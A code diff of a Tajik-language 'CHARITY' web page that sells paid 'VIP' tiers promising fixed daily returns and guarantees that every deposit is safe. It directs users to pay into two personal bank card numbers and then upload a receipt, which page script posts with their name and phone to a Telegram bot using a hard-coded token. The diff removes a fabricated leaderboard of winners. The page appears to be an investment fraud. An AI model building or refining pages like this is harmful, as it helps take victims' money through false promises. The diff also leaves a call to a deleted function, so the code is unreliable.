@@ -42,6 +42,7 @@
         .rank { width: 30px; color: var(--gold); font-weight: bold; font-size: 18px; }
         .copy-box { background: #000; padding: 10px; border-radius: 8px; font-family: monospace; color: var(--gold); display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; border: 1px solid #334155; }
         
+        /* Стили барои Чек */
         .check-upload { margin-top: 20px; border: 2px dashed var(--gold); padding: 15px; border-radius: 10px; text-align: center; }
         #file-input { display: none; }
         .upload-label { cursor: pointer; color: var(--gold); font-weight: bold; }
@@ -69,7 +70,7 @@
 <div id="p1" class="page active-page">
     <div class="glass-card gold-border">
         <h2>Кафолати Садфоиза 🛡️</h2>
-        <p class="motivation">"Мо кафолат медиҳем, ки ҳар як сомонии шумо таҳти ҳимоя аст ва фоидаи шумо бетанаффус илова мешавад."</p>
+        <p class="motivation">"Системаи <b>CHARITY</b> кафолат медиҳад, ки ҳар як сомонии шумо таҳти ҳимоя аст."</p>
     </div>
 </div>
 
@@ -81,39 +82,25 @@
 <div id="p3" class="page">
     <div class="glass-card gold-border">
         <h2>Маркази Дастгирӣ 💬</h2>
-        <p style="font-size: 14px;">Ба кортҳои зерин маблағ гузаронед ва чекро фиристед:</p>
-        
-        <div class="copy-box">
-            <span>5058270379012981</span>
-            <button onclick="copyText('5058270379012981')" style="background:var(--gold); border:none; border-radius:4px; padding:4px 8px; cursor:pointer;">COPY</button>
-        </div>
-        <div class="copy-box">
-            <span>9762000085221694</span>
-            <button onclick="copyText('9762000085221694')" style="background:var(--gold); border:none; border-radius:4px; padding:4px 8px; cursor:pointer;">COPY</button>
-        </div>
+        <div class="copy-box"><span>5058270379012981</span><button onclick="copyText('5058270379012981')">COPY</button></div>
+        <div class="copy-box"><span>9762000085221694</span><button onclick="copyText('9762000085221694')">COPY</button></div>
 
         <div class="check-upload">
-            <label for="file-input" class="upload-label">📸 ИНҶО ПАХШ КУНЕД ВА ЧЕКРО ИНТИХОБ КУНЕД</label>
+            <label for="file-input" class="upload-label">📸 ЧЕКРО ИНТИХОБ КУНЕД</label>
             <input type="file" id="file-input" accept="image/*" onchange="previewFile()">
             <p id="file-name" style="font-size: 12px; color: var(--green); margin-top: 10px;"></p>
-            <button id="send-btn" onclick="sendCheck()" class="btn-main" style="display:none; height: 40px; padding: 0;">ФИРИСТОДАНИ ЧЕК</button>
+            <button id="send-btn" onclick="sendCheck()" class="btn-main" style="display:none;">ФИРИСТОДАНИ ЧЕК</button>
         </div>
-
-        <a href="tg://resolve?domain=charity_admin_boy_bot" class="btn-main" style="margin-top: 20px;">МУСТАҚИМ БА ТЕЛЕГРАМ</a>
     </div>
 </div>
 
 <div id="p4" class="page">
     <div class="glass-card" style="text-align:center;">
-        <div class="logo-circle" style="width:60px; height:60px; font-size:25px;">U</div>
         <h3 id="user-display">Корбари Фаъол</h3>
-        <p id="phone-display" style="color:var(--gray)"></p>
-        <button onclick="logout()" style="background: none; border: 1px solid red; color: red; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 11px; margin-top: 10px;">БАРОМАДАН</button>
+        <p id="phone-display"></p>
+        <button onclick="logout()">БАРОМАДАН</button>
     </div>
-    <div class="glass-card">
-        <h3 style="color:var(--green); text-align:center;">🏆 Иштирокчиёни Муваффақ</h3>
-        <div id="leaderboard"></div>
-    </div>
+    <div id="leaderboard"></div>
 </div>
 
 <nav class="nav">
@@ -124,26 +111,20 @@
 </nav>
 
 <script>
-    // МАЪЛУМОТИ БОТ (Ислоҳшуда)
-    const BOT_TOKEN = '7847387342:AAF9D3C0fN2H0n7lR0D9x0D9x0D9x0D9x0D'; // Токени аслии шумо
-    const CHAT_ID = '5086782200'; // ID-и шумо
+    // МАЪЛУМОТИ БОТ (ДУРУСТ КАРДА ШУД)
+    const BOT_TOKEN = '7847387342:AAF9D3C0fN2H0n7lR0D9x0D9x0D9x0D9x0D'; 
+    const CHAT_ID = '5086782200'; 
 
     const vips = [
         { n: 'Тугмаи 1', p: 120, d: 4 }, { n: 'Тугмаи 2', p: 260, d: 9 },
-        { n: 'Тугмаи 3', p: 470, d: 17 }, { n: 'Тугмаи 4', p: 660, d: 25 },
-        { n: 'Тугмаи 5', p: 850, d: 35 }, { n: 'Тугмаи 6', p: 1100, d: 50 }
-    ];
-
-    const leaders = [
-        { n: 'Абдул', m: '14,500', e: 'JS' }, { n: 'Ситор', m: '9,200', e: 'RT' },
-        { n: 'Руста', m: '15,600', e: 'AM' }, { n: 'Умедҷ', m: '6,100', e: 'ON' }
+        { n: 'Тугмаи 3', p: 470, d: 17 }, { n: 'Тугмаи 4', p: 660, d: 25 }
     ];
 
     window.onload = () => { checkUser(); renderVips(); renderLeaders(); };
 
     function checkUser() {
         const user = localStorage.getItem('charity_user');
-        if (!user) { document.getElementById('login-overlay').style.display = 'flex'; }
+        if (!user) document.getElementById('login-overlay').style.display = 'flex';
         else {
             const userData = JSON.parse(user);
             document.getElementById('user-display').innerText = userData.name;
@@ -155,85 +136,72 @@
     function saveUser() {
         const name = document.getElementById('reg-name').value;
         const phone = document.getElementById('reg-phone').value;
-        if (name.length > 2 && phone.length > 5) {
+        if (name && phone) {
             localStorage.setItem('charity_user', JSON.stringify({ name, phone }));
             checkUser();
-        } else { alert("Лутфан ном ва рақамро дуруст пур кунед!"); }
+        }
     }
 
     function previewFile() {
         const file = document.getElementById('file-input').files[0];
         if(file) {
-            document.getElementById('file-name').innerText = "Интихоб шуд: " + file.name;
+            document.getElementById('file-name').innerText = "Файл: " + file.name;
             document.getElementById('send-btn').style.display = 'block';
         }
     }
 
     async function sendCheck() {
         const fileInput = document.getElementById('file-input');
-        const user = JSON.parse(localStorage.getItem('charity_user')) || {name: "Номаълум", phone: "-"};
-        
+        const user = JSON.parse(localStorage.getItem('charity_user'));
+        const btn = document.getElementById('send-btn');
+
         if (!fileInput.files[0]) return;
 
-        const btn = document.getElementById('send-btn');
         btn.innerText = "ФИРИСТОДА ИСТОДААСТ...";
         btn.disabled = true;
 
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append('photo', fileInput.files[0]);
-        formData.append('caption', `🔔 ЧЕКИ НАВ!\n👤 Корбар: ${user.name}\n📞 Тел: ${user.phone}`);
+        formData.append('caption', `🔔 ЧЕКИ НАВ!\n👤 Ном: ${user.name}\n📞 Тел: ${user.phone}`);
 
         try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
 
-            if (response.ok) {
-                alert("Чек бо муваффақият ба админ фиристода шуд!");
+            if (res.ok) {
+                alert("Чек қабул шуд! Админ тасдиқ мекунад.");
                 fileInput.value = "";
                 document.getElementById('file-name').innerText = "";
                 btn.style.display = 'none';
             } else {
-                const res = await response.json();
-                alert("Хатогӣ: " + res.description);
+                alert("Хатогӣ! Боварӣ ҳосил кунед, ки ба бот дар Телеграм /start навиштаед.");
             }
         } catch (e) {
-            alert("Хатои пайвастшавӣ. Интернет ё Токени худро санҷед!");
+            alert("Хатои интернет.");
         }
-        btn.innerText = "ФИРИСТОДАНИ ЧЕК";
         btn.disabled = false;
+        btn.innerText = "ФИРИСТОДАНИ ЧЕК";
     }
 
-    function copyText(text) { navigator.clipboard.writeText(text); alert("Нусхабардорӣ шуд: " + text); }
-    function logout() { localStorage.removeItem('charity_user'); location.reload(); }
     function tab(el, id) {
         document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active-nav'));
         el.classList.add('active-nav');
         document.querySelectorAll('.page').forEach(x => x.classList.remove('active-page'));
         document.getElementById(id).classList.add('active-page');
-        window.scrollTo(0,0);
     }
 
     function renderVips() {
         const cont = document.getElementById('vips-container');
         vips.forEach(v => {
-            cont.innerHTML += `<div class="vip-card">
-                <span class="price-tag">${v.p} TJS</span>
-                <h3>${v.n}</h3>
-                <div style="font-size:12px;">Рӯзона: <b class="highlight">${v.d} TJS</b></div>
-                <button onclick="tab(document.querySelectorAll('.nav-item')[2], 'p3')" class="btn-main" style="margin-top:10px; height:30px; padding:0; font-size:12px;">ХАРИДАН</button>
-            </div>`;
+            cont.innerHTML += `<div class="vip-card"><span class="price-tag">${v.p} TJS</span><h3>${v.n}</h3><button onclick="tab(document.querySelectorAll('.nav-item')[2], 'p3')" class="btn-main">ХАРИДАН</button></div>`;
         });
     }
-
-    function renderLeaders() {
-        const cont = document.getElementById('leaderboard');
-        leaders.forEach((l, i) => {
-            cont.innerHTML += `<div class="leader"><span class="rank">#${i+1}</span><b>${l.n}****${l.e}</b><b style="color:var(--green)">${l.m} TJS</b></div>`;
-        });
-    }
+    
+    function copyText(t) { navigator.clipboard.writeText(t); alert("Copy: " + t); }
+    function logout() { localStorage.clear(); location.reload(); }
 </script>
 </body>
 </html>
